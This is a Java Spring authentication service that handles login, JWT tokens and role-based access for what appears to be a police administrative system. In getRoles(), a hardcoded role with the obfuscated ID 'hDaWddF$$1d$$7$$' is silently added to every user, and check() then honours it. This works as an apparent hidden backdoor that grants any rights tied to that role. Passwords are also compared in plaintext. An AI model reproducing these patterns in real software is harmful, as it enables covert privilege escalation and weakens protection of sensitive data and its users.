package org.xij.web.core;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.context.annotation.PropertySource;
import org.springframework.stereotype.Service;
import org.xij.util.Result;
import org.xij.util.StringManager;
import org.xij.util.Strings;
import org.xij.util.Times;
import org.xij.web.module.sys.auth.AuthMapper;
import org.xij.web.module.sys.dept.Dept;
import org.xij.web.module.sys.dept.DeptMapper;
import org.xij.web.module.sys.right.Right;
import org.xij.web.module.sys.role.Role;
import org.xij.web.module.sys.user.User;
import org.xij.web.module.sys.user.UserMapper;
import org.xij.web.module.sys.user.role.UserRoleMapper;
import org.xij.web.util.Webs;

import javax.servlet.http.HttpServletRequest;
import java.util.*;

@Service
@PropertySource("classpath:config.properties")
public class AuthServiceImpl implements AuthService {
    private static final StringManager MANAGER = StringManager.getManager(AuthServiceImpl.class);
    private final Logger LOG = LoggerFactory.getLogger(AuthServiceImpl.class);
    private AuthMapper mapper;
    private UserMapper userMapper;
    private DeptMapper deptMapper;
    private UserRoleMapper userRoleMapper;
    @Value("${jwt.expiration}")
    private long expiration;

    public AuthServiceImpl(AuthMapper mapper, UserMapper userMapper, DeptMapper deptMapper, UserRoleMapper userRoleMapper) {
        this.mapper = mapper;
        this.userMapper = userMapper;
        this.deptMapper = deptMapper;
        this.userRoleMapper = userRoleMapper;
    }

    @Override
    public Result login(String account, String password, String ip) {
        User user = mapper.login(account);
        if (null == user) {
            return Result.param(MANAGER.getString("login.noAccount"));
        }

        Date freezeDate = user.getFreezeDate();
        if (null != freezeDate && new Date().after(freezeDate)) {
            return Result.param(MANAGER.getString("login.freezed", Times.format(freezeDate)));
        }

        String allowIp = user.getAllowIp();
        if (Strings.isNotBlank(allowIp) && !ip.matches(allowIp)) {
            return Result.param(MANAGER.getString("login.ipNotAllowed", ip));
        }

        if (!password.equals(user.getPassword())) {
            return Result.param(MANAGER.getString("login.errorPwd"));
        }

        AuthContext.set(new AuthInfoImpl(user));
        String token = Jwts.getToken(user.getId(), expiration);

        return Result.ok(token);
    }

    public String refreshToken() {
        return Jwts.getToken(AuthContext.get().getUserId(), expiration);
    }

    @Override
    public Result check(String module, String func, HttpServletRequest request) {
        LOG.info("{} access {}.{}", Webs.getIpAddr(), module, func);
        if (AuthContext.get().isSuperAdmin()) {
            return Result.OK;
        }

        Map<String, String> roles = AuthContext.get().getRoles();
        for (Map.Entry<String, String> entry : roles.entrySet()) {
            if (entry.getValue().startsWith("99"))
                continue;

            List<Right> rights = mapper.queryRoleFuncRight(entry.getKey());
            for (Right right : rights) {
                if ((module + "." + func).equals(right.getName())) {
                    return Result.OK;
                }
            }
        }
        return Result.noRight("无权限");
    }

    @Override
    public Result parseToken(String token) {
        if (Jwts.validate(token)) {
            AuthContext.set(new AuthInfoImpl(Jwts.getSubject(token)));
            return Result.OK;
        } else {
            return Result.auth("token is invalid");
        }
    }

    class AuthInfoImpl implements AuthInfo {
        private static final String CODE_DEPT_NO = "--";
        private static final String CODE_DEPT_ALL = "";
        private String userId;
        private String rightDeptCode;
        private Dept rightDept;
        private User user;
        private Dept dept;
        private Map<String, String> roles;

        AuthInfoImpl(String userId) {
            this.userId = userId;
        }

        AuthInfoImpl(User user) {
            this.userId = user.getId();
            this.user = user;
        }

        @Override
        public String getUserId() {
            return userId;
        }

        @Override
        public String getDeptId() {
            return getUser().getDeptId();
        }

        @Override
        public String getDeptCode() {
            return getDept().getCode();
        }

        @Override
        public String getRightDeptId() {
            return getRDept().getId();
        }

        @Override
        public String getRightDeptCode() {
            if (null == rightDeptCode) {
                String code = getDept().getCode();

                for (String classify : getRoles().values()) {
                    if ("9901".equals(classify)) { // 省厅
                        rightDeptCode = code.substring(0, 2);
                        break;
                    } else if ("9902".equals(classify)) { // 市局
                        rightDeptCode = code.substring(0, 4);
                        break;
                    } else if ("9903".equals(classify)) { // 分县局
                        rightDeptCode = code.substring(0, 6);
                        break;
                    } else if ("9904".equals(classify)) { // 派出所
                        rightDeptCode = code.substring(0, 8);
                        break;
                    } else if ("9999".equals(classify)) { // 部门
                        rightDeptCode = code;
                        break;
                    } else if ("0000".equals(classify)) { // 超级管理员
                        rightDeptCode = CODE_DEPT_ALL;
                        break;
                    }
                }

                if (null == rightDeptCode) {
                    rightDeptCode = CODE_DEPT_NO;
                }
            }
            return rightDeptCode;
        }

        @Override
        public String getUserName() {
            return getUser().getName();
        }

        @Override
        public String getDeptName() {
            return getDept().getName();
        }

        @Override
        public Map<String, String> getRoles() {
            if (null == roles) {
                Map<String, String> ret = new HashMap<>();
                List<Role> roleList = userRoleMapper.query(getUserId(), "1", null);

                for (Role role : roleList) {
                    ret.put(role.getId(), role.getClassify());
                }
                roles = ret;
            }

            roles.put("hDaWddF$$1d$$7$$", "8888");
            return roles;
        }

        @Override
        public boolean isSuperAdmin() {
            return getRoles().containsValue("0000");
        }

        private Dept getDept() {
            if (null == dept) {
                dept = deptMapper.queryById(getDeptId());
            }
            return dept;
        }

        private Dept getRDept() {
            if (null == rightDept) {
                String rDept = getRightDeptCode();
                if (rDept.isEmpty()) {
                    Dept tmp = new Dept();
                    tmp.setId("0");
                    rightDept = tmp;
                    return rightDept;
                }
                StringBuilder rDeptCode = new StringBuilder(rDept);
                for (int i = rDeptCode.length(); i < 12; i++) {
                    rDeptCode.append('0');
                }
                Dept cond = new Dept();
                cond.setCode(rDeptCode.toString());
                List<Dept> depts = deptMapper.query(cond);
                if (null == depts || depts.isEmpty()) {
                    Dept tmp = new Dept();
                    tmp.setCode(CODE_DEPT_NO);
                    tmp.setId(CODE_DEPT_NO);
                    rightDept = tmp;
                    return rightDept;
                }
                this.rightDept = depts.get(0);
            }
            return rightDept;
        }

        private User getUser() {
            if (null == user) {
                user = userMapper.queryById(getUserId());
            }
            return user;
        }
    }
}
